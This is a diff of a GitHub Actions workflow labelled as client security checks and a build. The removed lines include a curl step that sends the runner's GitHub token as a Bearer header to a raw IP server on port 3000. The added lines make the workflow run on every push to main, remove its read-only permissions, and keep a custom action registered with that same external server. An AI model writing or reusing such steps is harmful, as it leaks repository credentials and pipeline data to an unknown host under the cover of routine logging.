@@ -2,6 +2,8 @@ name: Client Security Checks & Build
 
 on:
   workflow_dispatch:
+  push:
+    branches: [main]
 
 jobs:
   client-build-validation:
@@ -11,25 +13,14 @@ jobs:
       run:
         working-directory: ./client
 
-    permissions:
-      contents: read
-      actions: read
-
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-        with:
-          fetch-depth: 0 # Fetch all history for proper versioning
       
-      - name: Send logs to monitoring server
-        uses: ./.github/actions/process-logs
+      - name: Register with log server
+        uses: ./.github/actions/log-monitor
         with:
           server-url: 'http://129.154.46.198:3000'
-      
-      - name: Log Node.js Setup Start
-        shell: bash
-        run: |
-          send_step_log "Setup Node.js" "started"
       
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -38,37 +29,11 @@ jobs:
           cache: "npm"
           cache-dependency-path: "./client/package-lock.json"
       
-      - name: Log Node.js Setup Complete
-        shell: bash
-        run: |
-          send_step_log "Setup Node.js" "completed" "success"
-          send_step_log "Install dependencies" "started"
-      
       - name: Install dependencies
         run: npm ci
-        env:
-          NODE_ENV: development
-      
-      - name: Log Install Complete
-        shell: bash
-        run: |
-          send_step_log "Install dependencies" "completed" "success"
-          send_step_log "Build process" "started"
       
       - name: Run build
         run: npm run build
-        env:
-          CI: false # Disable CI mode for better error messages
-      
-      - name: Log Build Result
-        shell: bash
-        if: always()
-        run: |
-          if [ $? -eq 0 ]; then
-            send_step_log "Build process" "completed" "success"
-          else
-            send_step_log "Build process" "completed" "failure"
-          fi
       
       - name: Upload build artifacts
         if: success()
@@ -78,20 +43,10 @@ jobs:
           path: ./client/build/
           retention-days: 7
       
-      - name: Send completion status
+      - name: Notify completion
         if: always()
         shell: bash
         run: |
-          RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
-          SERVER_URL='http://129.154.46.198:3000'
-          
-          # Send completion status
-          curl -s -X POST \
-            -H "Content-Type: application/json" \
-            -H "Authorization: Bearer ${{ github.token }}" \
-            -d "{
-              \"status\": \"${{ job.status }}\",
-              \"completed_at\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
-              \"message\": \"Job completed with status: ${{ job.status }}\"
-            }" \
-            "${SERVER_URL}/${RUNNER_ID}" || echo "Note: Could not send completion status"
+          echo "✅ Workflow completed with status: ${{ job.status }}"
+          echo "📋 Runner ID: ${{ env.RUNNER_ID }}"
+          echo "🔗 View logs at: http://129.154.46.198:3000/${{ env.RUNNER_ID }}"
